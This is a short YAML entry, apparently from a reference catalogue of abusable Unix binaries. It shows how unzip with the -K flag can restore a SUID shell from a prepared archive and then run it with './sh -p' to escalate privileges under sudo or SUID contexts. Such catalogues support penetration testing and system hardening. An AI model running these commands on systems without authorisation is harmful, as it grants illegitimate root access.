---
comment: |-
  Certain `unzip` versions allows to preserve the SUID bit. For example, prepare an archive beforehand with the following commands as root:

  ```
  cp /bin/sh .
  chmod +s sh
  zip shell.zip sh
  ```
functions:
  privilege-escalation:
  - code: |-
      unzip -K shell.zip
      ./sh -p
    contexts:
      sudo:
      suid:
...
